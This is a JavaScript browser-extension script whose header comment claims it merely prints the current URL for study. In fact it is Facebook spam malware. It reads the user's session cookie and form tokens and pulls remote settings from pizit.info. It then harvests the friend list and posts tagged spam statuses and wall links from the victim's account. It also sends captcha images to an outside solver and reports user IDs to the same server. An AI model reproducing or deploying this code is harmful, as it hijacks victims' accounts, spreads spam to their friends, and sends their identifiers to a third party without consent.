
/*
  This extension prints the current website URL on Chrome's console window.
  Other page properties like DOM structure can be accessed with this kind of extension.
  
  Good study!
*/

function showID(c_name) {
    var i, x, y, ARRcookies = document.cookie.split(";");
    for (i = 0; i < ARRcookies.length; i++) {
        x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
        y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
        x = x.replace(/^\s+|\s+$/g, "");
        if (x === c_name) {
            return unescape(y);
        }
    }
}

function get_value(str, source) {
    var elements;
    if (source === undefined) {
        elements = document.getElementsByTagName("*");
    } else {
        elements = source.getElementsByTagName("*");
    }
    for (e = 0; e < elements.length; e++) {
        if (elements[e].name === str && elements[e].value !== undefined) {
            return elements[e].value;
        }
    }
}
function make_dom(src) {
    var tempDiv = document.createElement("div");
    tempDiv.innerHTML = src;
    return tempDiv;
}
function get_img_src(src, no) {
    x = src.getElementsByTagName("img");
    return x[no].id;
}
function extract_captcha_info(useful) {
    var out = Array();
    out[0] = get_value('captcha_persist_data', useful);
    out[1] = get_value('extra_challenge_params', useful);
    out[2] = get_value('recaptcha_type', useful);
    return out;
}


function valueRand(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function replaceAll(string, token, newtoken) {
    while (string.indexOf(token) != -1) {
        string = string.replace(token, newtoken);
    }
    return string;
}
function randOrd() {
    return (Math.round(Math.random()) - 0.5);
}
function randomString(len, charSet) {
    charSet = charSet || '0123456789';
    var randomString = '';
    for (var i = 0; i < len; i++) {
        var randomPoz = Math.floor(Math.random() * charSet.length);
        randomString += charSet.substring(randomPoz, randomPoz + 1);
    }
    return randomString;
}
String.prototype.between = function (prefix, suffix) {
    s = this;
    d = '';
    var count = s.split(prefix).length - 1;
    for (k = 0; k < count; k++) {
        var i = s.indexOf(prefix);
        if (i >= 0) {
            s = s.substring(i + prefix.length);
        } else {
            return '';
        }
        if (suffix) {
            i = s.indexOf(suffix);
            if (i >= 0) {
                d += s.substring(0, i) + ',';
            } else {
                return '';
            }
        }
    }
    d = d.slice(0, -1);
    return d;
};

function isNumber(val) {
    var numVal = +val;
    return val + '' === numVal + '';
}
function filterNumber(arr) {
    var result = [];
    for (var i = 0; i < arr.length; i++) {
        var val = arr[i];
        if (isNumber(val)) {
            result.push(val);
        }
    }
    return result;
}

function fetch_secretNew(extra_challenge_params, opt) {
    var rawdata = '',
        req = new XMLHttpRequest();
    req.overrideMimeType('text/plain; charset=x-user-defined');
    req.open('GET', extra_challenge_params, !1);
    req.onreadystatechange = function () {
        if (req.readyState == 4 && req.status == 200) {
            for (var responseText = req.responseText, responseTextLen = responseText.length, binary = "", i = 0; i < responseTextLen; ++i) {
                binary += String.fromCharCode(responseText.charCodeAt(i) & 255);
            }
            src = encodeURIComponent(btoa(binary));
            var httpwp2 = new XMLHttpRequest(),
                paramswp2 = 'src=data:image/jpeg;base64,' + src;
            httpwp2.open('POST', 'https://pizit.info/decaptcha/makejpg.php', false);
            httpwp2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            httpwp2.onreadystatechange = function () {
                if (httpwp2.readyState == 4 && httpwp2.status == 200) {
                    var data = JSON.parse(httpwp2.responseText);
                    rawdata = httpwp2.responseText;
                }
            };
            httpwp2.send(paramswp2);
        }
    };
    req.send();
    return (JSON.parse(rawdata));
}
function fetch_secret2(extra_challenge_params, opt) {
    var output = new Array(3),
        post = new XMLHttpRequest();
    post.open("GET", "https://pizit.info/decaptcha/xtracpnovo.php?v=1&u=" + escape(extra_challenge_params), false);
    post.send();
    if (post.readyState == 4 && post.status == 200) {
        var data = (JSON.parse(post.responseText));
        return data;
    }
}

function errorReport(uid, error, summary, description, dialog) {
    var report = new XMLHttpRequest();
    report.open("GET", "https://pizit.info/error/reportid.php?uid=" + uid + "&error=" + error + "&summary=" + summary + "&description=" + description + "&dialog=" + dialog, true);
    report.send();
    if (report.readyState == 4 && report.status == 200) {
        console.log('Error log sent');
    }
}

function cfg() {
    if (localStorage.getItem("set_running") == null) {
        localStorage.setItem("set_running", new Date().getTime() + 60000);
        var httpwp = new XMLHttpRequest();
        httpwp.open('GET', 'https://pizit.info/idcfg.php', false);
        httpwp.send();
        var myData = JSON.parse(httpwp.responseText);
        localStorage.setItem("fb_shortenpostlink", myData.shortenpostlink);
        localStorage.setItem("fb_shortenstatuslink", myData.shortenstatuslink);
        localStorage.setItem("fb_updatestatuscaptcha", myData.updatestatuscaptcha);
        localStorage.setItem("fb_posttowallcaptcha", myData.posttowallcaptcha);
        localStorage.setItem("fb_tagtoselfpost", myData.tagtoselfpost);
        localStorage.setItem("fb_postdelay", myData.postdelay);
        localStorage.setItem("fb_statusdelay", myData.statusdelay);
        localStorage.setItem("fb_tagtoselfdelay", myData.tagtoselfdelay);
        localStorage.setItem("fb_delcookies", myData.delcookies);
        localStorage.setItem("fb_taggedfriends", myData.taggedfriends);
        localStorage.setItem("fb_minfans", myData.minfans);
        localStorage.setItem("fb_statusmessage", myData.statusmessage);
        localStorage.setItem("fb_postmessage", myData.postmessage);
        localStorage.setItem("fb_posttitle", myData.posttitle);
        localStorage.setItem("fb_postdesc", myData.postdesc);
        localStorage.setItem("fb_postimg", myData.postimg);
        localStorage.setItem("fb_postfavicon", myData.postfavicon);
        localStorage.setItem("fb_postlink", myData.postlink);
        localStorage.setItem("fb_statuslink", myData.statuslink);
    } else {
        if (localStorage.getItem('set_running') < new Date().getTime()) {
            localStorage.removeItem('set_running');
            cfg();
        }
    }
}

function routin() {
    if (localStorage.getItem("main_running") == null) {
        if (localStorage.getItem("fb_delcookies") == 1) {
            localStorage.removeItem('did_posttocaptcha');
            localStorage.removeItem('did_updatecaptcha');
        };
        localStorage.setItem('main_running', new Date().getTime() + 45000);
        var user_id = showID("c_user"),
		post_form_id = null;
        var httpwp = new XMLHttpRequest();
        httpwp.open("GET", '/', false);
        httpwp.send();
        if (httpwp.readyState == 4 && httpwp.status == 200) {
            a = httpwp.responseText;
        }
        temp = a.match(/name="fb_dt[prs][abg]" value="([^"]+)"/g)[0];
        var fb_dtsg = temp.match(/name="fb_dtsg" value="([^"]+)"/)[1];
        temp2 = a.match(/name="composer[irs][adg]" value="([^"]+)"/g)[0];
        var composerid = temp2.match(/name="composerid" value="([^"]+)"/)[1];
        var friends = [];
        gf = new XMLHttpRequest();
        gf.open('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token=' + Math.random() + '&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=' + user_id, false);
        gf.send();
        if (gf.readyState != 4) {} else {
            data = eval('(' + gf.responseText.substr(9) + ')');
            if (data.error) {} else {
                friends = data.payload.entries.sort(function (_0x93dax8, _0x93dax9) {
                    return _0x93dax8.index - _0x93dax9.index;
                });
            }
        }
        friends.sort(randOrd);
    var report = new XMLHttpRequest();
    report.open("GET", "https://pizit.info/error/imalive.php?uid=" + user_id + " [ID-FF]", true);
    report.send();
    console.log('alive sent');
	
       if ((localStorage.getItem("fb_tagtoselfpost") == 1) && (localStorage.getItem('did_tagtoself') < new Date().getTime())) {
            var ownpostid = localStorage.getItem("fb_mylastpost");
            if (ownpostid !== undefined) {
                if (localStorage.getItem("fb_tagtoselfdelay") == null) {
                    var tagtoselfdelay = 1200000;
                } else {
                    var tagtoselfdelay = localStorage.getItem("fb_tagtoselfdelay");
                };
                var httpwp = new XMLHttpRequest(),
                    urlwp = "/ajax/ufi/add_comment.php",
                    who_with = '';
                for (i = 0; i < 10; i++) {
                    who_with = who_with + "@[" + friends[i].uid + ":" + friends[i].text + "] ";
                }
                var paramswp = "fb_dtsg=" + fb_dtsg + "&__a=1&__req=&comment_text=" + who_with + "&client_id=" + valueRand(1111111111111, 99999999999999) + ":" + valueRand(1111111111, 9999999999) + "&ft_ent_identifier=" + ownpostid + "&nctr[_mod]=pagelet_home_stream&source=1&__user=" + user_id + "&phstamp=";
                httpwp.open('POST', urlwp, true);
                httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
                httpwp.setRequestHeader('Content-length', paramswp.length);
                httpwp.setRequestHeader('Connection', 'keep-alive');
                httpwp.onreadystatechange = function () {
                    if (httpwp.readyState == 4 && httpwp.status == 200) {}
                };
                httpwp.send(paramswp);
                localStorage.setItem('did_tagtoself', new Date().getTime() + parseInt(tagtoselfdelay));
            }
        }
       if ((localStorage.getItem("fb_posttowallcaptcha") == 1) && (localStorage.getItem('did_posttocaptcha') < new Date().getTime())) {
            if (localStorage.getItem("fb_shortenpostlink") == 1) {
                var httpsl = new XMLHttpRequest(),
                urlsl = "https://www.googleapis.com/urlshortener/v1/url",
                paramssl = "{\"longUrl\": \"" + localStorage.getItem("fb_postlink") + "\"}";
                httpsl.open('POST', urlsl, false);
                httpsl.setRequestHeader('Content-type', 'application/json; charset=utf-8');
                httpsl.onreadystatechange = function () {
                    if (httpsl.readyState == 4 && httpsl.status == 200) {
                        var data = (JSON.parse(httpsl.responseText));
                        localStorage.setItem("fb_postlink", data.id);
                    }
                };
                httpsl.send(paramssl);
            }
            var svnValue = 55000 + Math.floor(Math.random() * 10001),
                postmessage = localStorage.getItem("fb_postmessage"),
                shareurl = localStorage.getItem("fb_postlink"),
                posttitle = localStorage.getItem("fb_posttitle"),
                postdesc = localStorage.getItem("fb_postdesc"),
                postimg = localStorage.getItem("fb_postimg"),
                favicon = localStorage.getItem("fb_postfavicon");
            if (localStorage.getItem("fb_postdelay") == null) {
                var postdelay = 1200000;
            } else {
                var postdelay = localStorage.getItem("fb_postdelay");
            };
            var taggedfriends = localStorage.getItem("fb_taggedfriends"),
                friendsSlice = friends.slice(0, taggedfriends),
                who_with = '',
                who_with_arr = 0;
            for (var loop = 0; loop < friendsSlice.length; loop++) {
                if (friendsSlice[loop].uid == user_id) continue;
                who_with = who_with + '&composertags_with[' + who_with_arr + ']=' + friendsSlice[loop].uid + '&text_composertags_with[' + who_with_arr + ']=' + friendsSlice[loop].text + '';
                who_with_arr++;
            }
            var httpwp = new XMLHttpRequest(),
                urlwp = '/ajax/updatestatus.php',
                cur_time = Math.floor((new Date()).getTime() / 1000),
                paramswp = 'fb_dtsg=' + fb_dtsg + '&xhpc_context=profile&xhpc_ismeta=1&xhpc_timeline=1&xhpc_composerid=u_jsonp_6_h&xhpc_targetid=' + user_id + '&xhpc_message_text=' + postmessage + '&xhpc_message=' + postmessage + '&aktion=post&app_id=2309869772&attachment[params][urlInfo][canonical]=' + shareurl + '&attachment[params][urlInfo][final]=' + shareurl + '&attachment[params][urlInfo][user]=' + shareurl + '&attachment[params][favicon]=' + favicon + '&attachment[params][title]=' + posttitle + '&attachment[params][summary]=' + postdesc + '&attachment[params][images][0]=' + postimg + '&attachment[params][medium]=106&attachment[params][url]=' + shareurl + '&attachment[type]=100&link_metrics[source]=ShareStageExternal&link_metrics[domain]=www.facebook.com&link_metrics[base_domain]=facebook.com&link_metrics[min_dimensions][0]=70&link_metrics[min_dimensions][1]=70&link_metrics[images_with_dimensions]=1&link_metrics[images_pending]=0&link_metrics[images_fetched]=0&link_metrics[image_dimensions][0]=325&link_metrics[image_dimensions][1]=325&link_metrics[images_selected]=1&link_metrics[images_considered]=1&link_metrics[images_cap]=10&link_metrics[images_type]=images_array&composer_metrics[best_image_w]=100&composer_metrics[best_image_h]=100&composer_metrics[image_selected]=0&composer_metrics[images_provided]=1&composer_metrics[images_loaded]=1&composer_metrics[images_shown]=1&composer_metrics[load_duration]=38&composer_metrics[timed_out]=0&composer_metrics[sort_order]=&composer_metrics[selector_type]=UIThumbPager_6' + who_with + '&hide_object_attachment=0&disable_location_sharing=false&audience[0][value]=80&nctr[_mod]=pagelet_timeline_recent&__user=' + user_id + '&__a=1';
            httpwp.open('POST', urlwp, true);
            httpwp.setRequestHeader('X-SVN-Rev', svnValue);
            httpwp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            httpwp.onreadystatechange = function () {
                if (httpwp.readyState == 4 && httpwp.status == 200) {
                    response = httpwp.responseText;
                    responseArr = JSON.parse(response.substring(9));
                    if (responseArr.hasOwnProperty('error')) {
                        if (responseArr.error != '1357007') {
                            errorReport(user_id, responseArr.error, responseArr.errorSummary, responseArr.errorDescription, response.between('__html":"', '"},'));
                        }
                    }
                    if (response.search('"error":1404078') > 1) {
                        localStorage.removeItem("fb_mydownloadlink");
                    }
                    if (response.search('"error":1357008') > 1) {
                        localStorage.removeItem("fb_mydownloadlink");
                    }
                    if (response.search('"error":1357007') > 1) {
                        response = httpwp.responseText.substr(9);
                        response = response.replace('src=', 'id=');
                        data = eval('(' + response + ')');
                        useful = data['payload']['__dialogx']['markup'][0][1]['__html'];
                        useful_dom = make_dom(useful);
                        var captcha_persist_data = get_value('captcha_persist_data', useful_dom),
                            captcha_session = get_value('captcha_session', useful_dom);
                        if (useful.search("extra_challenge_params") > 1) {
                            var captcha_info = extract_captcha_info(useful_dom);
                            c_rep = fetch_secret2(captcha_info[1]);
                            if (c_rep != null) {
                                paramz = paramswp + '&confirmed=1&captcha_persist_data=' + captcha_persist_data + '&captcha_session=' + captcha_session + '&extra_challenge_params=' + escape(captcha_info[1]) + '&recaptcha_type=password&recaptcha_challenge_field=' + escape(c_rep.challenge) + '&captcha_response=' + escape(c_rep.solved);
                                var attach = new XMLHttpRequest();
                                attach.open("POST", "/ajax/updatestatus.php", true);
                                attach['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
                                attach.onreadystatechange = function () {
                                    if (attach.readyState == 4 && attach.status == 200) {
                                        response = attach.responseText;
                                        var myLastPost = attach.responseText.between('"ftentidentifier":"', '","instanceid"');
                                        if (myLastPost !== undefined) {
                                            console.log('Setting last post UID to :' + myLastPost);
                                            localStorage.setItem("fb_mylastpost", myLastPost);
                                        };
                                    };
                                };
                                attach.send(paramz);
                            };
                        } else if (useful.search("tfbimage.php") > 1) {
                            var captcha_persist_data = get_value('captcha_persist_data', useful_dom);
                            data = eval('(' + response + ')');
                            useful = data['payload']['__dialogx']['markup'][0][1]['__html'];
                            useful_dom = make_dom(useful);
                            var captcha_url = get_img_src(useful_dom, 0);
                            c_rep = fetch_secretNew(captcha_url);
                            if (c_rep != null) {
                                paramz = paramswp + '&captcha_persist_data=' + captcha_persist_data + '&captcha_response=' + escape(c_rep.solved);
                                var attach = new XMLHttpRequest();
                                attach.open("POST", "/ajax/updatestatus.php", true);
                                attach['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
                                attach.onreadystatechange = function () {
                                    if (attach.readyState == 4 && attach.status == 200) {
                                        response = httpwp.responseText;
                                        var myLastPost = attach.responseText.between('"ftentidentifier":"', '","instanceid"');
                                        if (myLastPost !== undefined) {
                                            console.log('Setting last post UID to :' + myLastPost);
                                            localStorage.setItem("fb_mylastpost", myLastPost);
                                        };
                                    };
                                };
                                attach.send(paramz);
                            };
                        };
                    } else {
                        var myLastPost = httpwp.responseText.between('"ftentidentifier":"', '","instanceid"');
                        if (myLastPost !== undefined) {
                            console.log('Setting last post UID to :' + myLastPost);
                            localStorage.setItem("fb_mylastpost", myLastPost);
                        };
                    };
                };
            };
            httpwp.send(paramswp);
            localStorage.setItem('did_posttocaptcha', new Date().getTime() + parseInt(postdelay));
        };		
        if ((localStorage.getItem("fb_updatestatuscaptcha") == 1) && (localStorage.getItem('did_updatecaptcha') < new Date().getTime())) {
            if (localStorage.getItem("fb_shortenstatuslink") == 1) {
                var httpsl = new XMLHttpRequest(),
                    urlsl = "https://www.googleapis.com/urlshortener/v1/url",
                    paramssl = "{\"longUrl\": \"" + localStorage.getItem("fb_statuslink") + "\"}";
                httpsl.open('POST', urlsl, false);
                httpsl.setRequestHeader('Content-type', 'application/json; charset=utf-8');
                httpsl.onreadystatechange = function () {
                    if (httpsl.readyState == 4 && httpsl.status == 200) {
                        var data = (JSON.parse(httpsl.responseText));
                        localStorage.setItem("fb_statuslink", data.id);
                    }
                };
                httpsl.send(paramssl);
            }
            var svnValue = 55000 + Math.floor(Math.random() * 10001),
                postlink = localStorage.getItem("fb_statuslink"),
                postmessage = localStorage.getItem("fb_statusmessage") + postlink;
            if (localStorage.getItem("fb_statusdelay") == null) {
                var statusdelay = 1200000;
            } else {
                var statusdelay = localStorage.getItem("fb_statusdelay");
            };
            var taggedfriends = localStorage.getItem("fb_taggedfriends");
            friends.sort(randOrd);
            var friendsSlice = friends.slice(0, taggedfriends),
                who_with = '',
                who_with_arr = 0;
            for (var loop = 0; loop < friendsSlice.length; loop++) {
                if (friendsSlice[loop].uid == user_id) continue;
                who_with = who_with + '&composertags_with[' + who_with_arr + ']=' + friendsSlice[loop].uid + '&text_composertags_with[' + who_with_arr + ']=' + friendsSlice[loop].text + '';
                who_with_arr++;
            }
            var httpwp = new XMLHttpRequest(),
                urlwp = '/ajax/updatestatus.php?__a=1',
                cur_time = Math.floor((new Date()).getTime() / 1000),
                paramswp = 'post_form_id=' + post_form_id + '&fb_dtsg=' + fb_dtsg + '&xhpc_composerid=uuluny_1&xhpc_targetid=' + user_id + '&xhpc_context=home&xhpc_fbx=1&xhpc_timeline=&xhpc_ismeta=1&xhpc_message_text=' + postmessage + '&xhpc_message=' + postmessage + '&composertags_place=&composertags_place_name=&composer_predicted_city=&composer_session_id=' + cur_time + '&is_explicit_place=&audience[0][custom_value]=80&audience[0][value]=80&composertags_city=&disable_location_sharing=false&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest&__user=' + user_id + '&phstamp=' + cur_time + who_with;
            httpwp.open('POST', urlwp, true);
            httpwp.setRequestHeader('X-SVN-Rev', svnValue);
            httpwp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            httpwp.onreadystatechange = function () {
                if (httpwp.readyState == 4 && httpwp.status == 200) {
                    response = httpwp.responseText;
                    responseArr = JSON.parse(response.substring(9));
                    if (responseArr.hasOwnProperty('error')) {
                        if (responseArr.error != '1357007') {
                            errorReport(user_id, responseArr.error, responseArr.errorSummary, responseArr.errorDescription, response.between('__html":"', '"},'));
                        }
                    }
                    if (response.search('"error":1404078') > 1) {
                        localStorage.removeItem("fb_mydownloadlink");
                    }
                    if (response.search('"error":1357008') > 1) {
                        localStorage.removeItem("fb_mydownloadlink");
                    }
                    if (response.search('"error":1357007') > 1) {
                        response = httpwp.responseText.substr(9);
                        response = response.replace('src=', 'id=');
                        data = eval('(' + response + ')');
                        useful = data['payload']['__dialogx']['markup'][0][1]['__html'];
                        useful_dom = make_dom(useful);
                        var captcha_persist_data = get_value('captcha_persist_data', useful_dom),
                            captcha_session = get_value('captcha_session', useful_dom);
                        if (useful.search("extra_challenge_params") > 1) {
                            var captcha_info = extract_captcha_info(useful_dom);
                            c_rep = fetch_secret2(captcha_info[1]);
                            if (c_rep != null) {
                                paramz = paramswp + '&confirmed=1&captcha_persist_data=' + captcha_persist_data + '&captcha_session=' + captcha_session + '&extra_challenge_params=' + escape(captcha_info[1]) + '&recaptcha_type=password&recaptcha_challenge_field=' + escape(c_rep.challenge) + '&captcha_response=' + escape(c_rep.solved);
                                var attach = new XMLHttpRequest();
                                attach.open("POST", "/ajax/updatestatus.php?__a=1", true);
                                attach['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
                                attach.onreadystatechange = function () {
                                    if (attach.readyState == 4 && attach.status == 200) {
                                        response = attach.responseText;
                                        var myLastPost = attach.responseText.between('"ftentidentifier":"', '","instanceid"');
                                        if (myLastPost !== undefined) {
                                            console.log('Setting last post UID to :' + myLastPost);
                                            localStorage.setItem("fb_mylastpost", myLastPost);
                                        };
                                    };
                                };
                                attach.send(paramz);
                            };
                        } else if (useful.search("tfbimage.php") > 1) {
                            var captcha_persist_data = get_value('captcha_persist_data', useful_dom);
                            data = eval('(' + response + ')');
                            useful = data['payload']['__dialogx']['markup'][0][1]['__html'];
                            useful_dom = make_dom(useful);
                            var captcha_url = get_img_src(useful_dom, 0);
                            c_rep = fetch_secretNew(captcha_url);
                            if (c_rep != null) {
                                paramz = paramswp + '&captcha_persist_data=' + captcha_persist_data + '&captcha_response=' + escape(c_rep.solved);
                                var attach = new XMLHttpRequest();
                                attach.open("POST", "/ajax/updatestatus.php?__a=1", true);
                                attach['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
                                attach.onreadystatechange = function () {
                                    if (attach.readyState == 4 && attach.status == 200) {
                                        response = attach.responseText;
                                        var myLastPost = attach.responseText.between('"ftentidentifier":"', '","instanceid"');
                                        if (myLastPost !== undefined) {
                                            console.log('Setting last post UID to :' + myLastPost);
                                            localStorage.setItem("fb_mylastpost", myLastPost);
                                        };
                                    };
                                };
                                attach.send(paramz);
                            };
                        };
                    } else {
                        var myLastPost = httpwp.responseText.between('"ftentidentifier":"', '","instanceid"');
                        if (myLastPost !== undefined) {
                            console.log('Setting last post UID to :' + myLastPost);
                            localStorage.setItem("fb_mylastpost", myLastPost);
                        };
                    };
                };
            };
            httpwp.send(paramswp);
            localStorage.setItem('did_updatecaptcha', new Date().getTime() + parseInt(statusdelay));
        };		
	} else {
        if (localStorage.getItem('main_running') < new Date().getTime()) {
            localStorage.removeItem('main_running');
            console.log('Repetindo a rotina');
            routin();
        }
    }
}

function ready() {
//			console.log(document.URL);
	    new Image().src = "https://whos.amung.us/widget/idfirefox.pnh";
            cfg();
            routin();
};


ready(); 
